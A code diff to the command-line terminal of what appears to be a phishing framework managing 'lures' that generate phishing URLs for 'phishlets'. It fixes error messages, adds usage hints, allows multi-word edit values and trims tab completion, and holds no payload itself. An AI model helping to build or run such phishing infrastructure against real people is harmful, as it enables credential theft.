@@ -1135,19 +1135,21 @@ func (t *Terminal) handleLures(args []string) error {
 				l.PausedUntil = t_now.Add(t_dur).Unix()
 				err = t.cfg.SetLure(l_id, l)
 				if err != nil {
-					return fmt.Errorf("edit: %v", err)
+					return fmt.Errorf("pause: %v", err)
 				}
 				return nil
+			} else {
+				return fmt.Errorf("usage: lures pause <id> <duration>  (e.g. lures pause 0 1h30m)")
 			}
 		case "unpause":
 			if pn == 2 {
 				l_id, err := strconv.Atoi(strings.TrimSpace(args[1]))
 				if err != nil {
-					return fmt.Errorf("pause: %v", err)
+					return fmt.Errorf("unpause: %v", err)
 				}
 				l, err := t.cfg.GetLure(l_id)
 				if err != nil {
-					return fmt.Errorf("pause: %v", err)
+					return fmt.Errorf("unpause: %v", err)
 				}
 
 				log.Info("lure for phishlet '%s' unpaused", l.Phishlet)
@@ -1155,12 +1157,14 @@ func (t *Terminal) handleLures(args []string) error {
 				l.PausedUntil = 0
 				err = t.cfg.SetLure(l_id, l)
 				if err != nil {
-					return fmt.Errorf("edit: %v", err)
+					return fmt.Errorf("unpause: %v", err)
 				}
 				return nil
+			} else {
+				return fmt.Errorf("usage: lures unpause <id>")
 			}
 		case "edit":
-			if pn == 4 {
+			if pn >= 4 {
 				l_id, err := strconv.Atoi(strings.TrimSpace(args[1]))
 				if err != nil {
 					return fmt.Errorf("edit: %v", err)
@@ -1169,7 +1173,7 @@ func (t *Terminal) handleLures(args []string) error {
 				if err != nil {
 					return fmt.Errorf("edit: %v", err)
 				}
-				val := args[3]
+				val := strings.Join(args[3:], " ")
 				do_update := false
 
 				switch args[2] {
@@ -1477,7 +1481,7 @@ func (t *Terminal) createHelp() {
 
 	h.AddCommand("lures", "general", "manage lures for generation of phishing urls", "Shows all create lures and allows to edit or delete them.", LAYER_TOP,
 		readline.PcItem("lures", readline.PcItem("create", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("get-url"), readline.PcItem("pause"), readline.PcItem("unpause"),
-			readline.PcItem("edit", readline.PcItemDynamic(t.luresIdPrefixCompleter, readline.PcItem("hostname"), readline.PcItem("path"), readline.PcItem("redirect_url"), readline.PcItem("phishlet"), readline.PcItem("info"), readline.PcItem("og_title"), readline.PcItem("og_desc"), readline.PcItem("og_image"), readline.PcItem("og_url"), readline.PcItem("params"), readline.PcItem("ua_filter"), readline.PcItem("redirector", readline.PcItemDynamic(t.redirectorsPrefixCompleter)))),
+			readline.PcItem("edit", readline.PcItemDynamic(t.luresIdPrefixCompleter, readline.PcItem("hostname"), readline.PcItem("path"), readline.PcItem("redirect_url"), readline.PcItem("phishlet"), readline.PcItem("info"), readline.PcItem("og_title"), readline.PcItem("og_desc"), readline.PcItem("og_image"), readline.PcItem("og_url"), readline.PcItem("ua_filter"), readline.PcItem("redirector", readline.PcItemDynamic(t.redirectorsPrefixCompleter)))),
 			readline.PcItem("delete", readline.PcItem("all"))))
 
 	h.AddSubCommand("lures", nil, "", "show all create lures")
